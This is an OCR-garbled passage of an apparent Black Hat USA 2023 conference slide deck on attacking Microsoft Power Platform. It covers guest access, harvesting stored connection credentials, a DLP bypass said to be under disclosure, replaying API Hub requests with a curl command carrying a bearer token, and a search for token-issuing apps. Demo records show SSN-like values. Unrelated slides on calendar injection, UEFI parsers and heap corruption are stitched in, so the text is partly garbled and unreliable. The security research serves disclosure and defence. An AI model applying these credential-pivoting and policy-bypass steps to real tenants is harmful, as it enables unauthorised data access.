> Recovered by OCR — confidence 96/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Power Apps |
This app isn't opening correctly
It looks like this app isn't compliant with the latest data loss prevention policies.
More
```

## Slide 76

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 95/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Power Apps |
This app isn't opening correctly
It looks like this app isn't compliant with the latest data loss prevention policies.
Less
It looks like this app isn't compliant with the latest data loss prevention policies.
Policy name: Deny Azure File Storage
Connector: shared_azurefile cannot be used since it is blocked by your company's admin.
```

## Slide 77

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 95/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Power Apps |
This app isn't opening correctly
It looks like this app isn't compliant with the lates) data loss prevention policies.
It looks like this app isn't compliant with the latest data loss prevention policies.
Policy name: Deny Azure File Storage
Connector: shared_azurefile cannot be used since it is blocked by your company's admin.
```

## Slide 78

So we were able to bypass the license requirement

But blocked by... DLP?

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 79

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
H Microsoft | Learn Documentation Training Certifications Q&A CodeSamples Assessments Shows Events
| P& Search | Sign in
Power Platform Getstarted\ Products Guidance Troubleshooting’ Release plans Resources v
\é Filter by title | Learn / Power Platform / ® @ Additional resources
¥ Data loss prevention policies
Overview
Create a DLP policy
Manage DLP policies
Data loss prevention SDK
Basic connector classification
Connector action control
Connector endpoint filtering
(preview)
DLP for custom connectors
DLP for Power Automate
DLP for desktop flows
Disable new connectors
View policies and policy scope
Effect of multiple policies
Impact on apps and flows
Exempt apps and flows
Data loss prevention policies
Article « 07/12/2023 « 7 contributors & Feedback
Your organization's data is likely one of the most important assets you're responsible for
safeguarding as an administrator. The ability to build apps and automation to use that data is a
large part of your company's success. You can use Power Apps and Power Automate for rapid
build and rollout of these high-value apps so that users can measure and act on the data in real
time. Apps and automation are becoming increasingly connected across multiple data sources
and multiple services. Some of these might be external, third-party services and might even
include some social networks. Users generally have good intentions, but they can easily
overlook the potential for exposure from data leakage to services and audiences that shouldn't
have access to the data.
You can create data loss prevention (DLP) policies that can act as guardrails to help prevent
users from unintentionally exposing organizational data. DLP policies can be scoped at the
environment level or tenant level, offering flexibility to craft sensible policies that strike the
right balance between protection and productivity. For tenant-level policies you can define the
scope to be all environments, selected environments, or all environments except ones you
cnacrificallhs aveliidda Enviranmant_laveal naliciac can hea dafinad far nna anvirnnmant at a tima
Documentation
Connector classification - Power Platform
About ways to categorize connectors within a DLP
policy.
Create a data loss prevention (DLP) policy -
Power Platform
In this topic, you learn how to create a data loss
prevention (DLP) policy in Power Apps
Impact of DLP policies on apps and flows -
Power Platform
About the impact of DLP policies on apps and
flows.
Show 5 more
```

## Slide 80

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 84/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Power Platform admin center
DLP Policies » New Policy
(ny Home
@ Policy name Name your policy
& Environments _ . .
Start by giving your new policy a name. You can change this later.
lL Analytics XY O Prebuilt connectors
Ee Billing (Preview) V Find SSN|
© Custom connectors
$03 Settings
f Resources Vv O scope
{3 Help + support
O Review
&, Data integration
GP Data (preview)
uta Policies “~
Power Platform
Conference 2023
Register now
Ra-L
```

## Slide 81

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 86/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Power Platform admin center
DLP Policies » New Policy
fy Home #3 Set default group
@ Policy name
&, Environments
Assign connectors ©
L Analytics w @ Prebuilt connectors
Ee Billing (Preview) Business (0) Non-business (1056) | Default Blocked (0) & Search connectors
© Custom connectors
Settings Connectors for non-sensitive data. Connectors in this group can’t share data with connectors in other groups. Unassigned
connectors will show up here by default.
Vv
Resources O Scope
Name Y Blockable Y Endpoint config
Help + support
O Review
Data integration . .
SharePoint : No No
GP Data (preview)
uta Policies “~ S| OneDrive for Business : No
Power Platform Dvnamics 365 (denrecated) : Yes
Conference 2023
Register now
```

## Slide 82

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 85/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Power Platform admin center
DLP Policies » New Policy
{ny Home & Move to Business Block Configure connector 53 Set default grou
9g group
@ Policy name _
2) Environments @ One or more of the selected connectors can’t be blocked.
2 Analytics v @ Prebuilt connectors ;
Assign connectors ©
ic Billing (Preview) “
O Custom connectors Business (0) Non-business (1056) | Default Blocked (0) P Search connectors
£03 Settings
F Vv Connectors for non-sensitive data. Connectors in this group can't share data with connectors in other groups. Unassigned
% Resources O scope group group: g
P connectors will show up here by default.
& Help + support
O Review | Name VY Blockable Y Endpoint config
&, Data integration
@® Data (preview) iv) SharePoint = No No
. . S| OneDrive for Business : No
Power Platform
Conference 2023
Register now
Back | | Cancel |
```

## Slide 83

#BHUSA @BlackHatEvents

https://www.zenity.io/microsoft-power-platform-dlp-bypass-uncovered-finding-5-parent-and-child-flow-execution/


> Recovered by OCR — confidence 81/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Power Platform admin center
DLP Policies » New Policy
{fn} Home & Move to Business Block Configure connector #3 Set default group
@ Policy name -
2) Environments @ One or more of the selected connectors can’t be blocked.
Assign connectors ©
es eat ell ~ Business (0) Non-business (1056) | Default Blocked (0) P Search connectors
with enforcing policies ‘=
for pre-existing resources of
ic Gin. a Connectors for non-sensitive data. Connectors in this group can't share data with connectors in other groups. Unassigned
; EE siccace Directo connectors will show up here by default.
. | Name Y Blockable Y Endpoint confi
DLP Bypass Uncovered-
GP Data Finding #4 iv) Ss) SharePoint : No No
[nt Polid
. Read more > S| OneDrive for Business : No
co, https://www.zenity.io/microsoft-power-platform-dlp-bypass-uncovered-finding-5-parent-and-child-flow-exec
Register now
```

## Slide 84

https://www.zenity.io/microsoft-power-platform-dlp-bypass-uncovered-finding-5-parent-and-child-flow-execution/ #BHUSA @BlackHatEvents


> Recovered by OCR — confidence 87/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Power Platform admin center
DLP Policies » New Policy
Home & Move to Business Block Configure connector #3 Set default group
@ Policy name
Environments led connectors can't be blocked.
brs ©
Finding #2 - HTTP calls wks
Finding #1 - The problem
with enforcing DLP policies E a
for pre-existing resources
-business (1056) | Default Blocked (0) P Search connectors
Yuval Adier
Customer Success Director
hsitive data. Connectors in this group can’t share data with connectors in other groups. Unassigned
p here by default.
Microsoft Power Platform
B pats Microsoft Power P DLP Bypass Uncovered- Name Y Blockable Y Endpoint config
° DLP Bypass Uncov Finding #2 - HTTP calls
GP Data Finding 2] SharePoint : No No
[nts Polid Read more >
- Read more > |S | OneDrive for Business : No
Register now
```

## Slide 85

https://www.zenity.io/microsoft-power-platform-dlp-bypass-uncovered-finding-5-parent-and-child-flow-execution/ #BHUSA @BlackHatEvents


> Recovered by OCR — confidence 81/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Power Platform admin center
DLP Policies » New Policy
Home r #3 Set default group
@ Policy name
Environments
Finding #3 - custom
connectors
DLP Bypass Ur GEenesies
Finding #1 - The problem . 5. eSiel locked (0) P& Search connectors
with enforcing DLP policies E
for pre-existing resources
Give, Microsoft Power Platform oup can't share data with connectors in other groups. Unassigned
@ Microsoft Power P| DLP Bypass Uncovered -
Finding #3 - Custom
: DLP Bypass Uncov Blockable Endpoint confi
aq Microsoft Power P yp P 9
“es DLP Bypass Uncoy Finding #2 — HTTP ae
@ Pat4 Finding #1 Read more > | No No
[nts Polid Read more >
. Read more > |S | OneDrive for Business : No
Register now
```

## Slide 86

https://www.zenity.io/microsoft-power-platform-dlp-bypass-uncovered-finding-5-parent-and-child-flow-execution/ #BHUSA @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
SA 20253
Power Platform admin center
Home
Environ
DLP Policies
@ Policy name
New Policy
ments |
Data
Data
Polid
Finding #1 - The problem
with enforcing DLP policies
for pre-existing resources
Microsoft Power P
DLP Bypass Uncovy
Finding #1
Microsoft Power P
DLP Bypass Uncovy
Finding #2 - HTTP
Finding #3 - custom
connectors
Microsoft Power P
DLP Bypass Uncoy
DLP Byp
>
Finding #4 - Unblockable wks
connectors og
Yuval Adler
Microsoft Power Platform
DLP Bypass Uncovered -
Finding #4 — Unblockable
connectors
Read more >
Read more >
Register now
Finding #3 - Cust
Connectors Read more >
Read more > No
OneDrive for Business : No
3 Set default group
PD Search connectors
tors in other groups. Unassigned
Endpoint config
No
```

## Slide 87

#BHUSA @BlackHatEvents

https://www.zenity.io/microsoft-power-platform-dlp-bypass-uncovered-finding-5-parent-and-child-flow-execution/


> Recovered by OCR — confidence 91/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Power Platform admin center
Home
Environ
DLP Policies
@ Policy name
New Policy
ments |
Data
Data
Polid
Finding #1 - The problem
with enforcing DLP policies
for pre-existing resources
Microsoft Power P
DLP Bypass Uncovy
Finding #1
Microsoft Power P
DLP Bypass Uncovy
Finding #2 - HTTP
Finding #3 - custom
connectors
Microsoft Power P|
DLP Bypass Uncoy
Finding #3 - Cust
Connectors
DLP Byp
Finding #4 - Unblockable
connectors
Microsoft Power P
DLP Bypass Uncov
Finding #4 — Unbla
connectors
Finding #5 - Parent and
child flow execution
roup
Microsoft Power Platform
DLP Bypass Uncovered -
Finding #5 — Parent and Child
Flow Execution
Read more >
Read more >
Read more >
Read more >
Read more >
Register now
OneDrive for Business
No
No
No
```

## Slide 88

DLP bypass disclosure in process Full writeup → <u>bit.ly/mbrg-bhusa23</u>

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 89

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 78/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
USA 20
— 7 New connection L Edit \@ Share ly Delete @ Details
Connections in Zenity Demo (default)
Canvas
() Learn
EP AGE Name Modified Status
o/* Flows
Al solutions =i Azure File Storage 9
| % Connections +A mae oes 3 wk ago Connected
More 0 Edit
jamieredingcustomerdata.table.core.windows.net/cust... Connected
Azure Table Storage \@ Share
e Power Platform i
enverprisefinancial financialreports.database.windows.n... Connected
@® Details
} enterprisecustomers customercareinsights.database.... 2 wk ago Connected
SQL Server
```

## Slide 90

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 94/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Environment
Power Apps & Zenity Demo (default)
Connections > enterprisecustomers customercareinsights.database.windows.net
+ Create
Learn Details Apps using this connection Flows using this connection
om Apps Connector name
SQL Server
Description
Flows Microsoft SQL Server is a relational database management system developed by Microsoft.
Connect to SQL Server to manage data. You can perform various actions such as create,
Solutions update, get, and delete on rows in a table.
Status
More
Connected
€& Power Platform Owner
Jamie Reding
Created
7/14/2022, 11:30:39 AM
Modified
7/12/2023, 12:03:31 AM
```

## Slide 91

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 92/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Environment
Connections > enterprisecustomers customercareinsights.database.windows.net
+ Create
Learn Details Apps using this connection Flows using this connection
EA Apps
Name
wo” Flows Customer Insights
Solutions
More
Customer Insights
€ Power Platform
Customer Insights
```

## Slide 92

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Environment
Connections > enterprisecustomers customercareinsights.database.windows.net
+ Create
Learn Details Apps using this connection Flows using this connection
A Apps
Name
a” Flows Customer Insights
Solutions
More
Customer Insights
e Power Platform
Customer Insights
```

## Slide 93

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 90/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Environment
Power Apps & Zenity Demo (default)
Apps > Customer Insights
+ Create
Details Versions Connections Flows
Learn
Owner
| Fe Apps Jamie Reding
Description
—# Tables Not provided
o/” Flows Created
7/14/2022, 11:47:48 AM
Solutions
Modified
More 7/12/2023, 12:06:25 AM
Web link
=] Power Platform
9ac4a140dd43
Mobile QR code
```

## Slide 94

#BHUSA @BlackHatEvents

## Slide 95

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Almost there ...
Customer Insights needs your permission to use the following. Please allow the
permissions to proceed.
SQL Server ® Premium:
customercareinsights.database.windows.net
Signed in
```

## Slide 96

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 83/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Power Apps | Customer Insights BSB oO +s & ?
[dbo].[Customers] C) Mt
Search items
aidenb@zenitydemo.OnMicrosoft.com
Aiden
Brown
alexanderw@zenitydemo.OnMicrosoft.co
Alexander
Gonzalez
amandas@zenitydemo.OnMicrosoft.com
Amanda
Smith
ameliaj@zenitydemo.OnMicrosoft.com
Amelia
Johnson
ameliam@zenitydemo.OnMicrosoft.com
Gonzalez —
andrewc@zenitydemo.OnMicrosoft.com
```

## Slide 97

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Power Apps | Customer Insights
< [dbo].[Customers]
55677
Email
aidenb@zenitydemo.OnMicrosoft.com
FirstName
Aiden
LastName
Brown
SocialSecurityNumber
209-97-8888
```

## Slide 98

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 79/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
® [0 | Elements Console Sources Network Performance Memory Application _ Security Lighthouse
-?qsp Invert Hide data URLs All Fetch/XHR JS CSS Img Media Font Doc WS Wasm Manifest Other Has blocked cookies Blocked Requests 3rd-party requests
\ 500 ms 1000 ms 1500 ms 2000 ms 2500 ms 3000 ms 3500 ms 4000 ms: 4500 ms 5000 ms 5500 ms 6000 ms 6500 ms 7000 ms 7500 ms 8000 ms 8500 ms: 9000 ms oso
[dbo].[Customers] C) a
r i Name X Headers
Search items
B invoke
1
2
aidenb@zenitydemo.OnMicrosoft.com 3
a
Aiden :
- “Email”: “aidenb@zenitydemo.OnMicrosoft.com",
Brown - "FirstName": "Aiden",
- “LastName”: “Brown”,
- “CustomerID”: 55677,
- “SocialSecurityNumber": “209-97-8888"
| d ityd OnMi f :
Alexander -
Gonzalez 2
- “SocialSecurityNumber": “209-97-9876"
= "Email": "amandas@zenitydemo.OnMicrosoft.com",
Amanda - “FirstName
. - “LastName
Smith 5 CustomerID": 78654,
- “SocialSecurityNumber": "209-97-6666"
9 }
2 {
10 “@odata.etag"
+ - “FirstName”: “Amelia”,
Amelia - “LastName”: “Johnson”,
- “CustomerID”: 76234,
Johnson - "SocialSecurityNumber": "209-97-1111"
- {
12 “@odata.etag":
- ItemInternall 1a9cb83a-919e-43ff-9db7-67a02358af83",
. . . - Email": “ameliam@zenitydemo.OnMicrosoft.com",
Amelia = "CustomerID": 74321,
- “SocialSecurityNumber": “209-97-9876"
Gonzalez 13 }
- {
14 "@odata.etag”:
- “ItemInternallid
andrewc@zenitydemo.OnMicrosoft.com :
```

## Slide 99

#BHUSA @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 83/100 on the text kept, 77/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
BEGIN:VCALENDAR
PRODID:-//caldav.icloud.com//CALDAVJ 2116B554//EN
VERSION:2.0
BEGIN:VEVENT
DTEND;TZID=Europe/London:202009[obscured]
ORGANIZER;CN=[obscured];EMAIL=[obscured]@icloud.com:[obscured]
[obscured]/principal/
UID:[obscured]
DTSTAMP:202103[obscured]
LOCATION:Home
SEQUENCE:1
SUMMARY:Meeting
LAST-MODIFIED:[obscured]
DTSTART;TZID=Europe/London:202009[obscured]
CREATED:202103[obscured]
ATTENDEE;CN=[obscured];CUTYPE=INDIVIDUAL;PARTSTAT=ACCEPTED;ROLE=CHAIR;
 EMAIL=[obscured]@icloud.com:[obscured]
[obscured]/principal/
DESCRIPTION]]>:x
ATTENDEE;EMAIL=[obscured];CN=[obscured]:[obscured]
[obscured]/principal/
ATTENDEE<![CDATA[:Notes

[red callout pointing at SEQUENCE:1]
Oh yeah, updated once!
```

## Slide 100

#BHUSA @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 85/100 on the text kept, 71/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Different Shades of UEFI Image Parsers

BmpDecoderDxe-A9F634A5-29F1-4456-A9D5-6E24B88BDB65
TgaDecoderDxe-ADCCA887-5330-414A-81A1-5B578146A397
PngDecoderDxe-C1D5258B-F61A-4C02-9293-A005BEB3EAA1
JpegDecoderDxe-2707E46D-DBD7-41C2-9C04-C9FDB8BAD86C
PcxDecoderDxe-A8F634A5-28F1-4456-A9D5-7E24B99BDB65
GifDecoderDxe-1353DE63-B74A-4BEF-80FD-2C5CFA83040B

SystemImageDecoderDxe-5F65D21A-8867-45D3-A41A-526F9FE2C598

AMITSE-B1DA0ADF-4F77-4070-A88E-BFFE1C60529A

MdeModulePkg/Library/BaseBmpSupportLib/BmpSupportLib.c

insyde
phoenix technologies
ami
tianocore
```

## Slide 101

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 89/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
[dbo].[Customers]
Search items
aidenb@zenitydemo.OnMicrosoft.com
Aiden
Brown
Alexander
Gonzalez
amandas@zenitydemo.OnMicrosoft.com
Amanda
Smith
ameliaj@zenitydemo.OnMicrosoft.com
Amelia
Johnson
ameliam@zenitydemo.OnMicrosoft.com
Amelia
Gonzalez
andrewc@zenitydemo.OnMicrosoft.com
Kk fo Elements Console Sources Network Performance Memory Application Security
®O!\YAa Preserve log Disable cache Nothrotting ¥ “ © &
-2qsp Invert © Hide data URLs All Fetch/XHR JS CSS Img Media Font Doc WS Wasm Manifest Other
5000 ms 10000 ms 15000 ms. 20000 ms 25000 ms
Name
: Name x Headers Preview
[) invoke
Open in new tab quest URL:
quest Method:
Clear browser cache bruetCores
Clear browser cookies mote Address:
Copy >
Copy link address
Block request URL Copy response
Block request domain Copy stack trace
Replay XHR
Copy as PowerShell
Sort By > Copy as fetch
Header Options > Copy as Node,js fetch
. Copy as CURL (cmd)
Save all as HAR with content
Copy as CURL (bash)
Override headers
Copy all as PowerShell
i Copy all as fetch
1 Copy all as Node,js fetch
\ Copy all as CURL (cmd)
> Copy all as CURL (bash)
> Copy all as HAR
Accept-Encoding:
Accept-Language: en-US.
Authorization:
Bearer
gzip, deflate, br
30000 ms
Lighthouse
Has blocked cookies Blocked Requests
3rd-party requests
35000 ms 40000 ms 45000 ms 50000 ms 55000 ms 60000 ms 65000 ms
hing-Allow-Origin,x-ms-apihub-cached-response,x-ms-apihub-obo
```

## Slide 102

## Copy-and-replay browser API Hub

#BHUSA @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 80/100 on the text kept, 72/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Preserving Heap Chunks

82c83f10: 4252 4c59 4252 4c59  4252 4c59 4252 4c59  BRLYBRLYBRLYBRLY
82c83f20: 4252 4c59 4252 4c59  4252 4c59 4252 4c59  BRLYBRLYBRLYBRLY
82c83f30: 4252 4c59 4252 4c59  4252 4c59 4252 4c59  BRLYBRLYBRLYBRLY
82c83f40: 4252 4c59 4252 4c59  4252 4c59 4252 4c59  BRLYBRLYBRLYBRLY
82c83f50: 4252 4c59 4252 4c59  4252 4c59 4252 4c59  BRLYBRLYBRLYBRLY
82c83f60: 4252 4c59 4252 4c59  4f4f 4f4f 4f4f 4f4f  BRLYBRLYOOOOOOOO
82c83f70: [obscured]                                 OOOOOOOOXhd0....
82c83f80: [obscured]                                 ........X.......
82c83f90: [obscured]                                 prtn....iL......
82c83fa0: [obscured]                                 (.......(kL.....
82c83fb0: [obscured]                                 .~........|.....
82c83fc0: [obscured]                                 ptal....X.......

This IS the object we can corrupt!!
```

## Slide 103

## Copy-and-replay browser API Hub

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 79/100 on the text kept, 59/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Copy-and-replay browser API Hub
[ /@mbrg@/BHUSA2023/A11-You-Need-Is-
-X 'POST' \
-H ‘authority: europe-@@2.azure
-H ‘accept: application/json' \
-H ‘accept-language: en-US' \
-H ‘authorization: Bearer eyJ@e
>
>
MAtop=100' \
Bd55b9e)' \
-H 'x-ms-client-object-id: 71bbe
-H 'x-ms-client-request-id: bOf«
-H 'x-ms-client-session-id: 1974
-H 'x-ms-client-tenant-id: c993
-H 'x-ms-protocol-semantics: cdf
-H 'x-ms-request-method: GET' \
-H 'x-ms-request-url: /apim/sql
-H 'x-ms-user-agent: PowerApps/:
Guest: ] ¢ curl 'httns:// = =ani i |
{
{
"@odata.etag":"", "ItemInternalId":"f1b79F06-ad40-4b2e-a482-d61c820fc5e6", "Email": "amandas@
```

## Slide 104

Power App is using azure-apim.net to fetch connection data

GET https://europe-002.azure-apim.net/apim /sql/ff47194e357e459b8756a5f43f59ccc6 /v2/datasets/customercareinsights.database.windows.n et,enterprisecustomers /tables/%255Bdbo%255D.%255BCustomers%255D/ite ms'

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 105

Power App is using azure-apim.net to fetch connection data

GET https://europe-002.azure-apim.net/apim /sql/ff47194e357e459b8756a5f43f59ccc6 /v2/datasets/customercareinsights.database.windows.n et,enterprisecustomers /tables/%255Bdbo%255D.%255BCustomers%255D/ite ms

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 106

Power App is using azure-apim.net to fetch connection data

GET https://europe-002.azure-apim.net/apim /sql/ff47194e357e459b8756a5f43f59ccc6 /v2/datasets/customercareinsights.database.windows.n et,enterprisecustomers /tables/%255Bdbo%255D.%255BCustomers%255D/ite ms

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 107

Power App is using azure-apim.net to fetch connection data GET https://europe-002.azure-apim.net/apim /sql/ff47194e357e459b8756a5f43f59ccc6 /v2/datasets/customercareinsights.database.windo ws.net,enterprisecustomers /tables/%255Bdbo%255D.%255BCustomers%255D/ite ms

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 108

Power App is using azure-apim.net to fetch connection data GET https://europe-002.azure-apim.net/apim /sql/ff47194e357e459b8756a5f43f59ccc6 /v2/datasets/customercareinsights.database.windows.n et,enterprisecustomers /tables/%255Bdbo%255D.%255BCustomers%255D/it ems

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 109

Power App is using azure-apim.net to fetch connection data GET https://europe-002.azure-apim.net/apim /sql/ff47194e357e459b8756a5f43f59ccc6 /v2/datasets/customercareinsights.database.windows.n et,enterprisecustomers /tables/[dbo].[Customers]/items

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 110

##### docs.microsoft.com

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents


> Recovered by OCR — confidence 96/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
RESTful API
defined in
swagger
Power Automate
Power Apps
Logic Apps
docs.microsoft.com
```

## Slide 111

##### docs.microsoft.com

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Power Automate user token
connector ID
operation ID
connection ID
Power Apps <
Logic Apps
docs.microsoft.com
RESTful API
defined in
swagger
```

## Slide 112

##### docs.microsoft.com

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents


> Recovered by OCR — confidence 93/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
RESTful API
defined in
swagger
[credena and metadata sore
user token connection
connection ID token
Power Automate user token
connector ID
operation ID
connection ID
Power Apps
Logic Apps
docs.microsoft.com
```

## Slide 113

## Let’s take a closer look at this token

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 72/100 on the text kept, 46/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Let Ss take Nave i Heade
Kidd Open in new tab quest URL: !
quest Method: ‘
| Block request URL Copy response
[] Block request domain Copy stack trace
Replay XHR
3 Sort By » Copy as fetch
Header Ophons. , Copy as Nodes fetch
Copy as CURL (ord)
Save all as HAR with content
Copy 35 CURL (ashy
y Copy ail as fetch
\ Copy aif a CURL ford)
nitydemo.OnMicrosoft.com > Copy all as CURL (hash)
> Copy af as HAR
```

## Slide 114

#BHUSA @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ebugger Libraries Introduction s Crafted b' authd
Encoded Decoded
HEADER:
PAYLOAD:
```

## Slide 115

A scope away from victory Can we generate a token to API Hub?

#BHUSA @BlackHatEvents

## Slide 116

## A scope away from victory

Can we generate a token to API Hub? (reminder: generating tokens is trivial, it’s our user)

#BHUSA @BlackHatEvents

## Slide 117

## A scope away from victory

Can we generate a token to API Hub? (reminder: generating tokens is trivial, it’s our user)

#BHUSA @BlackHatEvents

## Slide 118

## A scope away from victory

Can we generate a token to API Hub? (reminder: generating tokens is trivial, it’s our user) Using a built-in public client app?

#BHUSA @BlackHatEvents

## Slide 119

## A scope away from victory

Can we generate a token to API Hub? (reminder: generating tokens is trivial, it’s our user) Using a built-in public client app? No.

#BHUSA @BlackHatEvents

## Slide 120

## A scope away from victory

Can we generate a token to API Hub? (reminder: generating tokens is trivial, it’s our user) Using a built-in public client app? No. Using our own app?

#BHUSA @BlackHatEvents

## Slide 121

## A scope away from victory

Can we generate a token to API Hub? (reminder: generating tokens is trivial, it’s our user) Using a built-in public client app? No. Using our own app? No.

#BHUSA @BlackHatEvents

## Slide 122

## A scope away from victory

Can we generate a token to API Hub? (reminder: generating tokens is trivial, it’s our user) Using a built-in public client app? No. Using our own app? No.

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 123

## Where are we again?

### Got guest access.

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 124

## Where are we again? Got guest access. Found a bunch of creds on PowerApps.

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 125

## Where are we again?

Got guest access. Found a bunch of creds on PowerApps.

Tried to access

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 126

Where are we again? Got guest access. Found a bunch of creds on PowerApps.

Tried to access → Blocked by license

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 127

Where are we again? Got guest access. Found a bunch of creds on PowerApps. Tried to access → Blocked by license → Got a license

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 128

Where are we again? Got guest access. Found a bunch of creds on PowerApps. Tried to access → Blocked by license → Got a license → Blocked by DLP

@mbrg0 #BHUSA @BlackHatEvents @mbrg0 #BHUSA @BlackHatEvents #BHUSA@BlackHatEvents

## Slide 129

Where are we again? Got guest access. Found a bunch of creds on PowerApps. Tried to access → Blocked by license → Got a license → Blocked by DLP → Pivoted connection _(bypass vuln under disclosure)_

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 130

## Where are we again?

Got guest access. Found a bunch of creds on PowerApps. Tried to access → Blocked by license → Got a license → Blocked by DLP → Pivoted connection _(bypass vuln under disclosure)_ → Blocked by prog access to API Hub

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 131

Solving for scope We need to find an AAD app that is:

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 132

## Solving for scope We need to find an AAD app that is: 1. On by-default (available on every tenant)

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 133

## Solving for scope We need to find an AAD app that is: 1. On by-default (available on every tenant) 2. Pre-approved to query API Hub (get internal resource)

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 134

## Solving for scope

- We need to find an AAD app that is: 1. On by-default (available on every tenant) 2. Pre-approved to query API Hub (get internal resource) 3. Public client (generate tokens on demand)

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 135

## Solving for scope We need to find an AAD app that is: 1. On by-default 2. Pre-approved to query API Hub 3. Public client

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 136

## Solving for scope

- We need to find an AAD app that is: 1. On by-default 2. Pre-approved to query API Hub 3. Public client

Well, we know about the PowerApps portal!

@mbrg0 #BHUSA @BlackHatEvents #BHUSA @BlackHatEvents

## Slide 137

## Solving for scope

